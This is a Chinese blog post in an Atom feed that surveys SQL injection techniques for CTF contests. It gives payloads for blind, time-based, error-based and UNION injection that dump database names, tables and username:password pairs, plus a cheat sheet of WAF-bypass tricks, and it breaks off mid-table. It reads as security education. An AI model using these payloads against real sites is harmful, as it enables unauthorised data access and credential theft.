<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>芝麻酱</title>
  
  <subtitle>踩坑记</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.kaide0521.cn/"/>
  <updated>2020-03-12T16:07:52.000Z</updated>
  <id>https://blog.kaide0521.cn/</id>
  
  <author>
    <name>芝麻酱</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中的SQL注入</title>
    <link href="https://blog.kaide0521.cn/2020/03/10/CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.kaide0521.cn/2020/03/10/CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-10T13:46:37.000Z</published>
    <updated>2020-03-12T16:07:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-何为SQL注入？"><a href="#1-何为SQL注入？" class="headerlink" title="1 何为SQL注入？"></a><strong>1 何为SQL注入？</strong></h3><p>SQL注入是一种注入攻击，由于用户的输入也是SQL执行语句的一部分，所以攻击者可以利用有注入漏洞的功能点，注入自己定义的语句，改变SQL语句结构，从而影响执行逻辑，让数据库执行任意的指令，查询数据库中任何自己需要的数据，甚至可以直接获取数据库服务器的系统权限。</p><h3 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2 盲注"></a><strong>2 盲注</strong></h3><p>所谓盲注的本质就是猜解，就是通过“感觉”来判断当前字段是否存在注入，那何为感觉？答案是：差异（感觉到运行时间的差异和页面返回结果的差异）。也就是说我们通过构造一条语句来注入到SQL布尔表达式中，使得布尔表达式执行结果的真假直接影响整条语句的执行使得系统呈现不同的反应，布尔盲注就是页面返回内容有差异，时间盲注就是执行时间有差异。</p><p><img src="https://img-blog.csdnimg.cn/20200312214229745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-1-Bool盲注"><a href="#2-1-Bool盲注" class="headerlink" title="2.1 Bool盲注"></a>2.1 Bool盲注</h4><p>常用于猜解数据的表达式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 0、and 1、or 1、1 &amp; 1、id = 0 | 1、id = 0 | 0、id = 1^0、id = 0||1</span><br><span class="line"></span><br><span class="line">ELT(N ,str1 ,str2 ,str3 ,…)</span><br><span class="line">函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL</span><br><span class="line"></span><br><span class="line">1'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">then</span> <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><h4 id="2-2-基于时间的盲注"><a href="#2-2-基于时间的盲注" class="headerlink" title="2.2 基于时间的盲注"></a>2.2 基于时间的盲注</h4><p>基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段。</p><p>常用函数：sleep() 和 benchmark()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id = 1-sleep(2)</span><br><span class="line">id = 1-benchmark(10000000,md5(1))</span><br><span class="line">通过条件语句中结合延时函数达到猜解目标字段值</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span>-<span class="keyword">if</span>(<span class="keyword">mid</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>)&lt;<span class="string">'a'</span>,<span class="keyword">sleep</span>(<span class="number">1</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">insert</span> 和 <span class="keyword">update</span> 的基于时间盲注示例</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> username = <span class="string">'0'</span>|<span class="keyword">if</span>((<span class="keyword">substr</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) regexp <span class="number">0x5e5b6d2d7a5d</span>), <span class="keyword">sleep</span>(<span class="number">5</span>), <span class="number">1</span>) <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">15</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span> (<span class="number">16</span>,<span class="string">'dds'</span>,<span class="string">'0'</span>| <span class="keyword">if</span>((<span class="keyword">substr</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) regexp <span class="number">0x5e5b6d2d7a5d</span>), <span class="keyword">sleep</span>(<span class="number">5</span>), <span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。<br>比较常见的是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid() substr() locate() position() substring() left() regexp like rlike length() char_length() ord() ascii() char() hex()</span><br></pre></td></tr></table></figure><p>以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。</p><p>参见拆解表达式填充位置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">' or (payload) or ' </span><br><span class="line">' and (payload) and ' </span><br><span class="line">' or (payload) and ' </span><br><span class="line">' or (payload) and '=' </span><br><span class="line">'* (payload) *' </span><br><span class="line">' or (payload) and ' </span><br><span class="line">" – (payload) – "</span><br><span class="line">" +(payload) + "</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3 报错注入"></a><strong>3 报错注入</strong></h3><h4 id="3-1-xpath解析错误型报错"><a href="#3-1-xpath解析错误型报错" class="headerlink" title="3.1 xpath解析错误型报错"></a>3.1 xpath解析错误型报错</h4><p>这里一般只用到了两个函数，extractvalue（）、updatexml（），关于两个函数的功能，有不清楚的可以自行查阅学习，这里不做过多介绍。报错原因很简单，updatexml第二个参数需要的是Xpath格式的字符串，如果我们输入的不符合，就会报错。报错回显内容的最大长度是32位的，所以有所局限。因此遇到一些比较长的字符需要主出时候，常常配合mid()、substr等函数执行多次查询，最后的结果由这些碎片字符进行拼接。</p><p>常见套路：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id=1' and 1=extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=(updatexml(1,concat(0x3a,(select database()),0x3a),1))%23</span></span><br><span class="line"><span class="string">爆表</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br><span class="line">爆字段</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">'),0x7e)) --+</span></span><br><span class="line"><span class="string">爆值</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>或者使用updatexml函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">爆数据库版本信息</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)  </span><br><span class="line">链接用户</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)  </span><br><span class="line">链接数据库</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) </span><br><span class="line">爆库</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)  </span><br><span class="line">爆表</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> table_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆字段</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> column_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)  </span><br><span class="line">爆字段内容</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,<span class="keyword">password</span>,<span class="number">0x23</span>) <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>以上说的基本都是查询的时候进行报错注入，有的时候报错注入存在与update、insert语句中</p><p>Insert报错注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="string">'jack'</span> <span class="keyword">or</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">concat</span>(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">''</span>, <span class="string">'hahahaahah'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> security.user (<span class="keyword">id</span>, uname, passwd,email) <span class="keyword">VALUES</span> (<span class="number">211</span>,<span class="number">1</span>=updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">concat_ws</span>(<span class="string">':'</span>,<span class="keyword">id</span>, uname, passwd) <span class="keyword">FROM</span> security.user <span class="keyword">as</span> x <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span> <span class="string">''</span>, <span class="string">'ohmygod_is_r00tgrok'</span>,<span class="string">'sssssss'</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">make_set</span>(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag)),<span class="number">1</span>)</span><br><span class="line">[Err] <span class="number">1105</span> - XPATH syntax <span class="keyword">error</span>: <span class="string">'~,flag&#123;abdg678899nsn-dhsns98dj-d'</span></span><br></pre></td></tr></table></figure><h4 id="3-2-利用几何函数报错"><a href="#3-2-利用几何函数报错" class="headerlink" title="3.2 利用几何函数报错"></a>3.2 利用几何函数报错</h4><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. geometrycollection()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">2. multipoint()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">3. polygon()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> Polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">4. multipolygon()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">5. linestring()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">6. multilinestring()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line">7. exp()</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><p>这些报错注入函数对数据库的版本有要求，高版本的数据库并不能成功</p><p>其中Polygon(ls1, ls2, …) 一个非常好玩的函数，如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> - Polygon(<span class="keyword">id</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------------------------</span></span><br><span class="line">[<span class="keyword">SQL</span>]<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> - Polygon(<span class="keyword">id</span>)</span><br><span class="line">[Err] <span class="number">1367</span> - Illegal non geometric <span class="string">'`awd_bank`.`users`.`id`'</span> <span class="keyword">value</span> <span class="keyword">found</span> during parsing</span><br></pre></td></tr></table></figure><h4 id="3-3-concat-rand-group-by-导致主键重复"><a href="#3-3-concat-rand-group-by-导致主键重复" class="headerlink" title="3.3 concat+rand()+group_by()导致主键重复"></a>3.3 concat+rand()+group_by()导致主键重复</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line">[SQL]<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line">[Err] 1062 - Duplicate entry '5.7.261' for key '&lt;group_key&gt;'</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(table_name,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line">[SQL]<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(table_name,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line">[Err] 1062 - Duplicate entry 'global_variables0' for key '&lt;group_key&gt;'</span><br></pre></td></tr></table></figure><h4 id="3-4-重复列名报错"><a href="#3-4-重复列名报错" class="headerlink" title="3.4 重复列名报错"></a>3.4 重复列名报错</h4><p>使用列名重复来进行报错注入</p><p>name_const报错型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式</span><br><span class="line"><span class="keyword">select</span>* <span class="keyword">from</span> (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">0</span>))a <span class="keyword">join</span>(<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">0</span>))b)c</span><br><span class="line"><span class="keyword">version</span>()改成<span class="keyword">database</span>()或者<span class="keyword">user</span>()就不行</span><br></pre></td></tr></table></figure><p>join函数爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from(select * from test a join test b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name 'id'</span><br><span class="line">mysql&gt; select * from(select * from test a join test b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name 'name'</span><br></pre></td></tr></table></figure><h4 id="3-5-整数溢出报错"><a href="#3-5-整数溢出报错" class="headerlink" title="3.5 整数溢出报错"></a>3.5 整数溢出报错</h4><p>测试发现在mysql5.5.47可以在报错中返回查询结果：而在mysql&gt;5.5.53时，则不能返回查询结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">from</span> dual)))<span class="string">'</span></span><br></pre></td></tr></table></figure><p>利用以下语句能爆出所有字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">2</span>* <span class="keyword">if</span>((<span class="keyword">SELECT</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>) <span class="keyword">as</span> x <span class="keyword">limit</span> <span class="number">1</span>) &gt; (<span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>), <span class="number">18446744073709551610</span>, <span class="number">18446744073709551610</span>);</span><br><span class="line">[Err] 1690 - BIGINT UNSIGNED value is out of range in '(2 * if(((select</span><br><span class="line"> `awd_bank`.`users`.`id`,`awd_bank`.`users`.`username`,`awd_bank`.`users`.`password`,`awd_bank`.`users`.`money`</span><br><span class="line">from `awd_bank`.`users` limit 1) &gt; (select</span><br><span class="line">`awd_bank`.`users`.`id`,`awd_bank`.`users`.`username`,`awd_bank`.`users`.`password`,`awd_bank`.`users`.`money`</span><br><span class="line">from `awd_bank`.`users` limit 1)),18446744073709551610,18446744073709551610))'</span><br></pre></td></tr></table></figure><h3 id="4-UNION联合查询注入"><a href="#4-UNION联合查询注入" class="headerlink" title="4 UNION联合查询注入"></a>4 UNION联合查询注入</h3><p>当页面存在明显数据查询回显的时候，同时又存在 SQL注入漏洞，这时候可尝试通过union查询注出需要的数据。比如：<br>?id=1 注入，首先通过order by猜测列数，?id=1’ order by 5%23，最后发现order by 后为3的时候不报错，因此可以判断改SQL语句查询的结果有3列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> %<span class="number">23</span></span><br><span class="line">爆表</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">0</span><span class="string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">?id=0'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> %<span class="number">23</span></span><br><span class="line">爆字段值</span><br><span class="line"><span class="number">0</span><span class="string">' union select 1,group_concat(username,0x3a,password),3 from users %23</span></span><br></pre></td></tr></table></figure><p>已知某个地方有注入，waf拦截了information_schema、columns、tables、database、schema等关键字或函数，我们如何去获取当前字段名呢？</p><p>常见的做法有利用union搭配别名子查询，在不知道字段的时候进行注入。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">SELECT</span> e<span class="number">.3</span> <span class="keyword">from</span>(<span class="keyword">SELECT</span> * <span class="keyword">from</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a,(<span class="keyword">SELECT</span> <span class="number">2</span>)b,(<span class="keyword">SELECT</span> <span class="number">3</span>)c,(<span class="keyword">SELECT</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">users</span>)e <span class="keyword">LIMIT</span> <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">1</span>)f,(<span class="keyword">select</span> <span class="number">1</span>)g,(<span class="keyword">select</span> <span class="number">1</span>)h,(<span class="keyword">select</span> <span class="number">1</span>)i;</span><br></pre></td></tr></table></figure><h3 id="5-绕过姿势备忘录"><a href="#5-绕过姿势备忘录" class="headerlink" title="5 绕过姿势备忘录"></a><strong>5 绕过姿势备忘录</strong></h3><table><thead><tr><th>相关姿势</th><th>具体描述</th></tr></thead><tbody><tr><td>or and过滤</td><td>大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/*or*/<br>利用符号 and=&amp;&amp; or=||</td></tr><tr><td>空格过滤</td><td>%09 TAB键（水平）%0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格</td></tr><tr><td>关键字的绕过</td><td>注释符绕过:uni/**/on se/**/lect <br> 大小写绕过:UniOn SeleCt <br> 双关键字绕过:ununionion seselectlect <br> &lt;&gt;绕过:unio&lt;&gt;n sel&lt;&gt;ect <br>/*!00000select*/绕过关键字和正则过滤</td></tr><tr><td>宽字节注入</td><td>过滤单引号时，可以试试宽字节%bf%27 %df%27 %aa%27</td></tr><tr><td>大于号小于号拦截绕过</td><td>id=1 and greatest(ascii(substr(username,1,1)),1)=97 <br> id=1 and strcmp(ascii(substr(username,1,1)),1); <br> id = 1 and substr(username,1,1) in (‘a’); <br> id = 1 and substr(username,1,1) between 0x61 and 0x63;</td></tr><tr><td>逗号绕过</td><td>在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。<br>对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset<br>select * from sql_test where ascii(mid(username from 1 for 1))&gt;1;<br>substr(x from 1 for 1) mid(x from 1 for 1)<br>select查询时候不使用逗号进行注入的姿势<br>id=3’ union select * from(select database()) a join (select version() ) b %23<br>?id=3’ union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = ‘sqli’ ) a join (select version() ) b %23<br>id=’ union select * from (select group_concat(column_name) from information_schema.columns where table_name = ‘users’ ) a join (select version() ) b %23<br>id=’ union select * 